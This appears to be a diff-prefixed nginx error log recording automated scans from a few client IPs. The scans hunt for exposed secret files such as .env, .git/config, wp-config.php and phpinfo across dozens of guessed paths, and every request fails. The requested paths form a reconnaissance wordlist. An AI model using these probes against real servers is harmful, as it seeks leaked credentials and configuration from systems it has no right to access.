+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/admin-app/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /admin-app/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/admin/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /admin/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/adminer/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /adminer/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/administrator/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /administrator/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/agora/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /agora/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/alpha/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /alpha/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/anaconda/..env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /anaconda/..env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/api/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /api/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/phpinfo" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /phpinfo HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:18 [error] 283#283: *49885 open() "/var/www/html/api/src/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /api/src/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app_dir/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app_dir/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app_nginx_static_path/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app_nginx_static_path/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app-order-client/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app-order-client/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app/client/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app/client/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app/config/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app/config/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/wp-config.php" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /wp-config.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app/config/dev/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app/config/dev/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app/frontend/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app/frontend/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app1-static/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app1-static/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/app2-static/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /app2-static/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/apps/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /apps/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/apps/client/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /apps/client/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/Archipel/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /Archipel/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/asset_img/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /asset_img/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/assets/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /assets/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/Assignment3/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /Assignment3/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/Assignment4/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /Assignment4/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/audio/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /audio/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/awstats/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /awstats/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/back-end/app/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /back-end/app/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/back/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /back/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/backend/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /backend/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/backend/src/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /backend/src/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/backendfinaltest/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /backendfinaltest/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/backup/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /backup/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/base_dir/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /base_dir/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/basic-network/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /basic-network/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/bgoldd/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /bgoldd/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/bitcoind/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /bitcoind/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/blankon/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /blankon/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/blob/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /blob/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/blog/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /blog/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/blue/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /blue/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/bookchain-client/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /bookchain-client/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/bootstrap/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /bootstrap/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/bucoffea/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /bucoffea/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/build/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /build/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/cardea/backend/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /cardea/backend/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/cdw-backend/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /cdw-backend/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/cgi-bin/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch2-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch2-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch6-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch6-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch6a-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch6a-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch7-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch7-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch7a-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch7a-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch8-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch8-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch8a-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch8a-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ch8b-mytodo/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ch8b-mytodo/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/Chai/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /Chai/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/challenge/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /challenge/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/challenges/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /challenges/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/charts/liveObjects/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /charts/liveObjects/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/chat-client/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /chat-client/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/chiminey/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /chiminey/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/client-app/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /client-app/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/client/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /client/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/client/mutual-fund-app/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /client/mutual-fund-app/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/client/src/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /client/src/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/ClientApp/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /ClientApp/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 17:52:19 [error] 283#283: *49885 open() "/var/www/html/clld_dir/.env" failed (2: No such file or directory), client: 193.41.206.36, server: localhost-nginx-proxy-manager, request: "GET /clld_dir/.env HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:51 [error] 283#283: *50110 open() "/var/www/html/modules/db/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /modules/db/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:51 [error] 283#283: *50111 open() "/var/www/html/v2/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /v2/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:51 [error] 283#283: *50112 open() "/var/www/html/staging_area/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /staging_area/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 283#283: *50113 open() "/var/www/html/logs/temp/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /logs/temp/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 283#283: *50114 open() "/var/www/html/modules/utils/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /modules/utils/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 283#283: *50115 open() "/var/www/html/public_html/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /public_html/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 285#285: *50116 open() "/var/www/html/staging/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /staging/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 285#285: *50117 open() "/var/www/html/devops/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /devops/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 285#285: *50118 open() "/var/www/html/logs/archived/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /logs/archived/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 285#285: *50119 open() "/var/www/html/prod/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /prod/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 285#285: *50120 open() "/var/www/html/lib/js/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /lib/js/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:17:52 [error] 285#285: *50121 open() "/var/www/html/infra/.git/config" failed (2: No such file or directory), client: 45.148.10.35, server: localhost-nginx-proxy-manager, request: "GET /infra/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 18:21:06 [error] 285#285: *50148 open() "/var/www/html/admin/config.php" failed (2: No such file or directory), client: 87.255.194.135, server: localhost-nginx-proxy-manager, request: "GET /admin/config.php HTTP/1.0", host: "207.180.195.219"
